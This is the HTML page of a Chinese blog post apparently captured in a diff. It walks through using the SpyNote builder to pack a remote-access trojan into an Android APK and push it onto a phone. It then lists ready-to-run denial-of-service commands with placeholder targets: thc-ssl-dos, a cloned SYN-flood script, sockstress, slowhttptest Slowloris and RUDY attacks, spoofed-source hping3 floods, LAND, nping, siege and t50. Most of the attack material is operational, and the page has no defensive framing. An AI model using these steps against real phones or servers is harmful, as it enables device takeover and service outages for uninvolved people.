@@ -1,0 +1,1454 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="keywords" content="手机木马移动安全以及拒绝服务攻击, Broken-year">
+    <meta name="description" content="认识手机木马以及移动安全android基于linux
+开发语言java
+应用广泛：什么地方都有java虚拟机
+但是：
+java-&amp;gt;臃肿-&amp;gt;java虚拟机-&amp;gt;c语言-&amp;gt;机器语言-&amp;gt;操作系统
+苹果：
+oc&amp;#x2F">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <meta name="renderer" content="webkit|ie-stand|ie-comp">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+    <title>手机木马移动安全以及拒绝服务攻击 | Broken-year</title>
+    <link rel="icon" type="image/png" href="/medias/logo.png">
+
+    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
+    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
+    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
+    <link rel="stylesheet" type="text/css" href="/css/matery.css">
+    <link rel="stylesheet" type="text/css" href="/css/my.css">
+
+    <script src="/libs/jquery/jquery-3.6.0.min.js"></script>
+
+<meta name="generator" content="Hexo 6.1.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+
+
+<body>
+    <header class="navbar-fixed">
+    <nav id="headNav" class="bg-color nav-transparent">
+        <div id="navContainer" class="nav-wrapper container">
+            <div class="brand-logo">
+                <a href="/" class="waves-effect waves-light">
+                    
+                    <img src="/medias/logo.png" class="logo-img" alt="LOGO">
+                    
+                    <span class="logo-span">Broken-year</span>
+                </a>
+            </div>
+            
+
+<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fas fa-bars"></i></a>
+<ul class="right nav-menu">
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/" class="waves-effect waves-light">
+      
+      <i class="fas fa-home" style="zoom: 0.6;"></i>
+      
+      <span>首页</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/tags" class="waves-effect waves-light">
+      
+      <i class="fas fa-tags" style="zoom: 0.6;"></i>
+      
+      <span>标签</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/categories" class="waves-effect waves-light">
+      
+      <i class="fas fa-bookmark" style="zoom: 0.6;"></i>
+      
+      <span>分类</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/archives" class="waves-effect waves-light">
+      
+      <i class="fas fa-archive" style="zoom: 0.6;"></i>
+      
+      <span>归档</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/about" class="waves-effect waves-light">
+      
+      <i class="fas fa-user-circle" style="zoom: 0.6;"></i>
+      
+      <span>关于</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/contact" class="waves-effect waves-light">
+      
+      <i class="fas fa-comments" style="zoom: 0.6;"></i>
+      
+      <span>留言板</span>
+    </a>
+    
+  </li>
+  
+  <li class="hide-on-med-and-down nav-item">
+    
+    <a href="/friends" class="waves-effect waves-light">
+      
+      <i class="fas fa-address-book" style="zoom: 0.6;"></i>
+      
+      <span>友情链接</span>
+    </a>
+    
+  </li>
+  
+  <li>
+    <a href="#searchModal" class="modal-trigger waves-effect waves-light">
+      <i id="searchIcon" class="fas fa-search" title="搜索" style="zoom: 0.85;"></i>
+    </a>
+  </li>
+</ul>
+
+
+<div id="mobile-nav" class="side-nav sidenav">
+
+    <div class="mobile-head bg-color">
+        
+        <img src="/medias/logo.png" class="logo-img circle responsive-img">
+        
+        <div class="logo-name">Broken-year</div>
+        <div class="logo-desc">
+            
+            这是一个简简单单的博客
+            
+        </div>
+    </div>
+
+    <ul class="menu-list mobile-menu-list">
+        
+        <li class="m-nav-item">
+	  
+		<a href="/" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-home"></i>
+			
+			首页
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/tags" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-tags"></i>
+			
+			标签
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/categories" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-bookmark"></i>
+			
+			分类
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/archives" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-archive"></i>
+			
+			归档
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/about" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-user-circle"></i>
+			
+			关于
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/contact" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-comments"></i>
+			
+			留言板
+		</a>
+          
+        </li>
+        
+        <li class="m-nav-item">
+	  
+		<a href="/friends" class="waves-effect waves-light">
+			
+			    <i class="fa-fw fas fa-address-book"></i>
+			
+			友情链接
+		</a>
+          
+        </li>
+        
+        
+    </ul>
+</div>
+
+
+        </div>
+
+        
+    </nav>
+
+</header>
+
+    
+
+
+
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
+    <div class="container" style="right: 0px;left: 0px;">
+        <div class="row">
+            <div class="col s12 m12 l12">
+                <div class="brand">
+                    <h1 class="description center-align post-title">手机木马移动安全以及拒绝服务攻击</h1>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+
+
+<main class="post-container content">
+
+    
+    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
+<style>
+    #articleContent h1::before,
+    #articleContent h2::before,
+    #articleContent h3::before,
+    #articleContent h4::before,
+    #articleContent h5::before,
+    #articleContent h6::before {
+        display: block;
+        content: " ";
+        height: 100px;
+        margin-top: -100px;
+        visibility: hidden;
+    }
+
+    #articleContent :focus {
+        outline: none;
+    }
+
+    .toc-fixed {
+        position: fixed;
+        top: 64px;
+    }
+
+    .toc-widget {
+        width: 345px;
+        padding-left: 20px;
+    }
+
+    .toc-widget .toc-title {
+        padding: 35px 0 15px 17px;
+        font-size: 1.5rem;
+        font-weight: bold;
+        line-height: 1.5rem;
+    }
+
+    .toc-widget ol {
+        padding: 0;
+        list-style: none;
+    }
+
+    #toc-content {
+        padding-bottom: 30px;
+        overflow: auto;
+    }
+
+    #toc-content ol {
+        padding-left: 10px;
+    }
+
+    #toc-content ol li {
+        padding-left: 10px;
+    }
+
+    #toc-content .toc-link:hover {
+        color: #42b983;
+        font-weight: 700;
+        text-decoration: underline;
+    }
+
+    #toc-content .toc-link::before {
+        background-color: transparent;
+        max-height: 25px;
+
+        position: absolute;
+        right: 23.5vw;
+        display: block;
+    }
+
+    #toc-content .is-active-link {
+        color: #42b983;
+    }
+
+    #floating-toc-btn {
+        position: fixed;
+        right: 15px;
+        bottom: 76px;
+        padding-top: 15px;
+        margin-bottom: 0;
+        z-index: 998;
+    }
+
+    #floating-toc-btn .btn-floating {
+        width: 48px;
+        height: 48px;
+    }
+
+    #floating-toc-btn .btn-floating i {
+        line-height: 48px;
+        font-size: 1.4rem;
+    }
+</style>
+<div class="row">
+    <div id="main-content" class="col s12 m12 l9">
+        <!-- 文章内容详情 -->
+<div id="artDetail">
+    <div class="card">
+        <div class="card-content article-info">
+            <div class="row tag-cate">
+                <div class="col s7">
+                    
+                    <div class="article-tag">
+                        
+                            <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                <span class="chip bg-color">网络安全</span>
+                            </a>
+                        
+                            <a href="/tags/android/">
+                                <span class="chip bg-color">android</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                <span class="chip bg-color">木马</span>
+                            </a>
+                        
+                            <a href="/tags/DDOS/">
+                                <span class="chip bg-color">DDOS</span>
+                            </a>
+                        
+                            <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">
+                                <span class="chip bg-color">拒绝服务攻击</span>
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+                <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                网络安全
+                            </a>
+                        
+                    </div>
+                    
+                </div>
+            </div>
+
+            <div class="post-info">
+                
+                <div class="post-date info-break-policy">
+                    <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
+                    2022-03-24
+                </div>
+                
+
+                
+
+                
+                <div class="info-break-policy">
+                    <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
+                    1.6k
+                </div>
+                
+
+                
+
+                
+                    <div id="busuanzi_container_page_pv" class="info-break-policy">
+                        <i class="far fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
+                        <span id="busuanzi_value_page_pv"></span>
+                    </div>
+				
+            </div>
+        </div>
+        <hr class="clearfix">
+
+        
+
+        
+
+        <div class="card-content article-card-content">
+            <div id="articleContent">
+                <h1 id="认识手机木马以及移动安全"><a href="#认识手机木马以及移动安全" class="headerlink" title="认识手机木马以及移动安全"></a>认识手机木马以及移动安全</h1><h2 id="android"><a href="#android" class="headerlink" title="android"></a>android</h2><p>基于linux</p>
+<p>开发语言java</p>
+<p>应用广泛：<br>什么地方都有java虚拟机</p>
+<p>但是：</p>
+<p>java-&gt;臃肿-&gt;java虚拟机-&gt;c语言-&gt;机器语言-&gt;操作系统</p>
+<p>苹果：</p>
+<p>oc&#x2F;swift-&gt;机器语言-&gt;操纵系统</p>
+<h2 id="关于java"><a href="#关于java" class="headerlink" title="关于java"></a>关于java</h2><p>网站：</p>
+<p>java web</p>
+<p>jsp+linux+mysql&#x2F;oracle&#x2F;db2+tomcat</p>
+<p>实际上更好用的：</p>
+<p>php+linux+nginx+mysql</p>
+<p>jvm pc：</p>
+<p>java&#x3D;&gt;jar程序</p>
+<p>但是：</p>
+<p>kotlin(简单！！！)&#x3D;&gt;jar程序</p>
+<p>c#(c++++难度不高，用户多)&#x2F;python（超级简单）都很牛逼</p>
+<p>Golang(c的精确度，python的快速开发，几乎啥事都能做)</p>
+<p>java android：</p>
+<p>java + c(编写.so&#x3D;windows的dll文件)&#x3D;&gt;android</p>
+<p>或者：</p>
+<p>kotlin(像python，写代码非常快)+c &#x3D;&gt; android</p>
+<h2 id="一些相关问题"><a href="#一些相关问题" class="headerlink" title="一些相关问题"></a>一些相关问题</h2><p>纠结什么语言有前途？</p>
+<p>主要看：这个语言后台的大佬有没有钱投入？</p>
+<p>c&#x2F;c++ 不可能落寞!!!全球都支持它<br>java 靠oracle公司支持，老旧设备<br>kotlin 谷歌+Intellj<br>oc&#x2F;swift 苹果公司<br>php 基金会，全球90%的网站都在使用<br>python 基金会，小部分人工智能开发&#x2F;快速开发的公司<br>go 谷歌，区块链开发公司<br>c++&#x2F;c#&#x2F;vb 微软公司</p>
+<h2 id="android木马"><a href="#android木马" class="headerlink" title="android木马:"></a>android木马:</h2><p>以云盘的：Last_Version为例，木马名字为SpyNote.exe</p>
+<p>并安装：</p>
+<p><img src="/2022/03/24/android/image-20220111154222265.png" alt="image-20220111154222265"></p>
+<p>java环境</p>
+<p>安装后，打开SpyNote.exe主控端：</p>
+<p><img src="/2022/03/24/android/image-20220111154539140.png" alt="image-20220111154539140"></p>
+<p>大多数情况，木马只需要具备：<br>上线，文件控制，提权（可有可无），命令执行</p>
+<p>如果想学android开发：<br>不要太在意自己学的是不是java，因为android上的编程，相当于一门长得很像java的java语言</p>
+<p>然后设置：</p>
+<p><img src="/2022/03/24/android/image-20220111154736842.png" alt="image-20220111154736842"></p>
+<p><img src="/2022/03/24/android/image-20220111154808544.png" alt="image-20220111154808544"></p>
+<p>也可以设置一些功能：</p>
+<p><img src="/2022/03/24/android/image-20220111154858453.png" alt="image-20220111154858453"></p>
+<p>简单测试一下：Build，把木马相关写入相应apk文件里：</p>
+<p><img src="/2022/03/24/android/image-20220111155022994-16418874238881.png" alt="image-20220111155022994"></p>
+<p>确保电脑的3210端口打开在监听状态。</p>
+<p>然后连接手机：</p>
+<pre><code>ftp://192.168.1.202:2221
+</code></pre>
+<p><img src="/2022/03/24/android/image-20220111155157025.png" alt="image-20220111155157025"></p>
+<p>把木马apk文件发送到手机文件里：</p>
+<p><img src="/2022/03/24/android/image-20220111155241421.png" alt="image-20220111155241421"></p>
+<p>然后用户安装了app后，打开之后，电脑端木马就上线了。</p>
+<p>然后就可以做很多事情了。</p>
+<h2 id="DOS拒绝服务攻击"><a href="#DOS拒绝服务攻击" class="headerlink" title="DOS拒绝服务攻击"></a>DOS拒绝服务攻击</h2><h2 id="DDOS分布式拒绝服务攻击"><a href="#DDOS分布式拒绝服务攻击" class="headerlink" title="DDOS分布式拒绝服务攻击"></a>DDOS分布式拒绝服务攻击</h2><p>tcp三次握手</p>
+<p>目前这种攻击无解<br>一般大佬的防御（用钱）</p>
+<h2 id="实验进行DOS攻击"><a href="#实验进行DOS攻击" class="headerlink" title="实验进行DOS攻击"></a>实验进行DOS攻击</h2><h3 id="kali的更新源设置为阿里云的："><a href="#kali的更新源设置为阿里云的：" class="headerlink" title="kali的更新源设置为阿里云的："></a>kali的更新源设置为阿里云的：</h3><p>目录&#x2F;etc&#x2F;apt&#x2F;source.list，下载到本机</p>
+<pre class=" language-bash"><code class="language-bash">deb http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+deb-src http://mirrors.aliyun.com/kali kali-rolling main non-free contrib
+
+<span class="token comment" spellcheck="true"># 如下图：</span>
+</code></pre>
+<p><img src="/2022/03/24/android/image-20220111160404450.png" alt="image-20220111160404450"></p>
+<p>设置完成后再把文件放回kali里</p>
+<p>然后在kali命令行：</p>
+<pre class=" language-Linux"><code class="language-Linux">apt-get update    # 更新
+
+apt-get install thc-ssl-dos    # 安装软件
+</code></pre>
+<h3 id="类似kali的安全审计系统——功能和隐蔽性较好"><a href="#类似kali的安全审计系统——功能和隐蔽性较好" class="headerlink" title="类似kali的安全审计系统——功能和隐蔽性较好"></a>类似kali的安全审计系统——功能和隐蔽性较好</h3><p><a target="_blank" rel="noopener" href="https://www.parrotsec.org/">https://www.parrotsec.org/</a></p>
+<p><img src="/2022/03/24/android/image-20220111160229567.png" alt="image-20220111160229567"></p>
+<p>需要安装。</p>
+<p>如果想直接导入虚拟机，不想安装，可以：</p>
+<p><img src="/2022/03/24/android/image-20220111160706009.png" alt="image-20220111160706009"></p>
+<p>用live模式打开parrot：</p>
+<p>用bitvise连接。</p>
+<pre class=" language-Linux"><code class="language-Linux">uname -a  # 查看相关
+</code></pre>
+<h2 id="DOS"><a href="#DOS" class="headerlink" title="DOS:"></a>DOS:</h2><h4 id="ssl-dos"><a href="#ssl-dos" class="headerlink" title="ssl-dos:"></a><strong>ssl-dos</strong>:</h4><p>服务器每次会处理300次&#x2F;s的ssl请求<br>这种攻击方法和传统攻击不一样，使用普通带宽也可以考虑打30G带宽的服务器</p>
+<p>安装</p>
+<pre class=" language-Linux"><code class="language-Linux">apt-get install thc-ssl-dos
+</code></pre>
+<p>目标是打击https的网站：</p>
+<pre class=" language-Linux"><code class="language-Linux">thc-ssl-dos [目标ip] [目标ssl端口:443] --accept
+</code></pre>
+<h4 id="syn-flood"><a href="#syn-flood" class="headerlink" title="syn flood:"></a>syn flood:</h4><p>syn洪水攻击</p>
+<pre class=" language-Linux"><code class="language-Linux">先安装：
+apt install python-scapy
+apt install python3-scapy
+</code></pre>
+<pre class=" language-Linux"><code class="language-Linux">从gethub上下载：
+git clone https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool.git
+cd Python-SYN-Flood-Attack-Tool
+</code></pre>
+<pre class=" language-Linux"><code class="language-Linux">ls
+ls -la
+chmod 777 ./*
+# 更改执行权限
+</code></pre>
+<pre class=" language-Linux"><code class="language-Linux">用Python去运行：
+python3 py3_synflood_cmd.py -t [目标ip：10.20.30.40] -p 8080 -c 5
+python3 py3_SYN-Flood.py
+python SYN-Flood.py
+</code></pre>
+<p><img src="/2022/03/24/android/image-20220111163648410.png" alt="image-20220111163648410"></p>
+<h4 id="sockstress"><a href="#sockstress" class="headerlink" title="sockstress:"></a>sockstress:</h4><p><img src="/2022/03/24/android/image-20220111163805588.png" alt="image-20220111163805588"></p>
+<p><img src="/2022/03/24/android/image-20220111163825703.png" alt="image-20220111163825703"></p>
+<p>针对tcp服务，耗尽目标资源，建立大量的sock连接，不消耗网络资源<br>完成tcp3次握手，最后ack大小为0（即客户端不接收数据）<br>攻击者损耗很小<br>异步攻击，所以一台设备可以造成很大的效果<br>windows窗口实现流控（流量控制）</p>
+<p>需要python2环境并且安装scapy</p>
+<pre class=" language-Linux"><code class="language-Linux">./sockstress.py [目标ip] [端口号] [线程]
+</code></pre>
+<h4 id="dns放大攻击"><a href="#dns放大攻击" class="headerlink" title="dns放大攻击:"></a>dns放大攻击:</h4><p>发送给dns的数据包94<br>返回的数据包大小160+</p>
+<p>典型的流量放大攻击<br>单机带宽优势，以小汇多<br>利用协议的特性放大流量</p>
+<pre class=" language-Linux"><code class="language-Linux">apt-get install dnsutils
+# 安装dig命令
+
+dig ANY qq.com @[dns的ip]
+dig ANY [目标域名（外网）] @[dns的服务器地址ip]
+# 利用回包判断dns服务器是否会被利用
+</code></pre>
+<p><img src="/2022/03/24/android/image-20220111164722176.png" alt="image-20220111164722176"></p>
+<h4 id="慢速攻击-打击网站有效果"><a href="#慢速攻击-打击网站有效果" class="headerlink" title="慢速攻击(打击网站有效果):"></a>慢速攻击(打击网站有效果):</h4><pre class=" language-Linux"><code class="language-Linux">apt-get install openssl
+apt-get install libssl-dev
+apt-get install slowhttptest
+</code></pre>
+<p><strong>slowhttptest</strong>软件原理：<br>低带宽应用层慢速DOS攻击（相对于cc慢）<br>擅长攻击apache tomcat…服务器</p>
+<p><strong>Slowloris,slow http post</strong>攻击<br>耗尽应用并发的连接池，类似于http层的<strong>syn_flood</strong><br>http协议<strong>默认</strong>在服务端全部接收到请求之后才开始处理，如果客户发送的数据包慢速而且不完整，就会导致Dos</p>
+<p><strong>Slowloris攻击</strong>:完整的http结尾是\r\n\r\n，它的攻击结尾\r\n<br><strong>slow http post</strong>攻击:http头部content-length声明长度，但是body缓慢发送</p>
+<p><strong>slow http post</strong>慢速攻击(<strong>RUDY</strong>):</p>
+<pre class=" language-Linux"><code class="language-Linux">slowhttptest -c 2000 -B -g -o body_states -i 110 -r 200 -s 8192 -t FAKEVERB -u http://192.168.1.214 -x 10 -p 3
+
+# -c 并发连接数
+# -H 默认攻击
+# -B http的post攻击、rudy攻击
+# -R 耗尽对方内存
+# -X 慢速读取
+# -o 把结果状态输出成一个文件
+# -i 中间停留时间
+# -l 持续攻击时间
+# -r 每秒建立连接数
+# -s 头部长度
+# -t 请求方式
+# -u URL
+# -f 需要什么样的头
+# -p 默认几秒没相应即判定已死亡
+</code></pre>
+<p><strong>Slowloris</strong>攻击：</p>
+<pre class=" language-Linux"><code class="language-Linux">slowhttptest -c 2000 -H -g -o my_header_states -i 10 -r 1000 -t GET -u http://192.168.1.214 -x 24 -p 3
+</code></pre>
+<h3 id="hping3"><a href="#hping3" class="headerlink" title="hping3:"></a>hping3:</h3><p>定制发送任何的数据包</p>
+<pre class=" language-Linux"><code class="language-Linux">-a   #伪造源地址
+-q   #不返回
+-n   #不解析域名
+-s   #源端口
+-d   #字节数
+-p   #端口
+--flood   #以flood方式攻击
+</code></pre>
+<p>syn-flood</p>
+<pre class=" language-Linux"><code class="language-Linux">hping3 -c 3000 -d 120 -S -w 64 -p 80 --flood --rand-source [目标ip]
+hping3 -S -P -p 80 --flood --rand-source [目标ip]
+</code></pre>
+<p>tcp-flood</p>
+<pre class=" language-Linux"><code class="language-Linux">hping3 -SARUFP -p 80 --flood --rand-source [目标ip]
+</code></pre>
+<p>icmp-flood</p>
+<pre class=" language-Linux"><code class="language-Linux">hping3 -q -n -a 1.1.1.1 --icmp -d 56 --flood [目标ip]
+</code></pre>
+<p>udp-flood</p>
+<pre class=" language-Linux"><code class="language-Linux">hping3 -a 1.1.1.1 --udp -s 53 -d 100 -p 53 --flood [目标ip]
+</code></pre>
+<p>LAND<br>特殊的syn-flood攻击<br>源地址和目的地址都是受害者，自己和自己完成3次握手</p>
+<pre class=" language-Linux"><code class="language-Linux">hping3 -n -a [目标ip] -S -d 100 -p 80 --flood [目标ip]
+</code></pre>
+<p>TCP全链接DOS攻击</p>
+<pre class=" language-Linux"><code class="language-Linux">nping --tcp-connect --rate=10000 -c 10000000 -q [目标ip]
+</code></pre>
+<h3 id="siege攻击："><a href="#siege攻击：" class="headerlink" title="siege攻击："></a>siege攻击：</h3><pre class=" language-Linux"><code class="language-Linux">siege -i -c 1000000 [目标ip] -A httttttp
+</code></pre>
+<h3 id="t50压力测试："><a href="#t50压力测试：" class="headerlink" title="t50压力测试："></a>t50压力测试：</h3><p>网络协议支持全面</p>
+<pre class=" language-Linux"><code class="language-Linux">t50 -h    #可以查看参数
+
+t50 [目标网关] --flood --turbo -S --protocol TCP --dport 22
+
+t50 --flood --protocol TCP [目标ip] --dport 80
+</code></pre>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">Broken-year</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="http://Broken-year.github.io/2022/03/24/android/">http://Broken-year.github.io/2022/03/24/android/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">Broken-year</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                                    <span class="chip bg-color">网络安全</span>
+                                </a>
+                            
+                                <a href="/tags/android/">
+                                    <span class="chip bg-color">android</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%9C%A8%E9%A9%AC/">
+                                    <span class="chip bg-color">木马</span>
+                                </a>
+                            
+                                <a href="/tags/DDOS/">
+                                    <span class="chip bg-color">DDOS</span>
+                                </a>
+                            
+                                <a href="/tags/%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1%E6%94%BB%E5%87%BB/">
+                                    <span class="chip bg-color">拒绝服务攻击</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2022/03/25/gongfangshijie/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="攻防世界Web进阶篇">
+                        
+                        <span class="card-title">攻防世界Web进阶篇</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2022-03-25
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" class="post-category">
+                                    网络安全
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">
+                        <span class="chip bg-color">网络安全</span>
+                    </a>
+                    
+                    <a href="/tags/web/">
+                        <span class="chip bg-color">web</span>
+                    </a>
+                    
+                    <a href="/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/">
+                        <span class="chip bg-color">攻防世界</span>
+                    </a>
+                    
+                    <a href="/tags/CTF/">
+                        <span class="chip bg-color">CTF</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2022/03/24/back-door/">
+                    <div class="card-image">
+                        
+                        
